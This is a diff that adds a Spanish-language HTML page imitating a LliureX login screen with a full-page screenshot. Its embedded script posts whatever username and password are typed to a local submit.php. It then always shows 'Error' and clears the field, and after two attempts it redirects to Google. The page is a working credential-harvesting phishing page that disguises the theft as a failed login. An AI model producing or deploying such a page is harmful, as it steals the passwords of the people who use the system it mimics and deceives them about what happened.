@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LLiurex</title>
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body>
+    <input placeholder="Usuario" autocomplete="off" type="text" name="user" id="user" autofocus>
+    <input placeholder="Contraseña" type="password" name="password" id="password">
+    <button id="Acceder" style="text-align: center;">Acceder</button>
+    <img src="LliurexLogin.png" width="100%" height="100%">
+    <script src="main.js"></script>
+    <script>
+        function holamundo() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "./server/submit.php", true);
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        // Aquí puedes manejar la respuesta del servidor si es necesario
+                        console.log("Datos enviados correctamente.");
+                    } else {
+                        console.error("Error al enviar datos.");
+                    }
+                }
+            };
+            var params = "user=" + User.value + "&password=" + Password.value;
+            xhr.send(params);
+
+            Password.value = ""
+            Password.placeholder = "Error"
+
+            if (attemps === 2) {
+                // Redirige a Google después del segundo intento fallido
+                window.open("https://google.com", "_self");
+            }
+
+            attemps++;
+        }
+    </script>
+</body>
+
+</html>
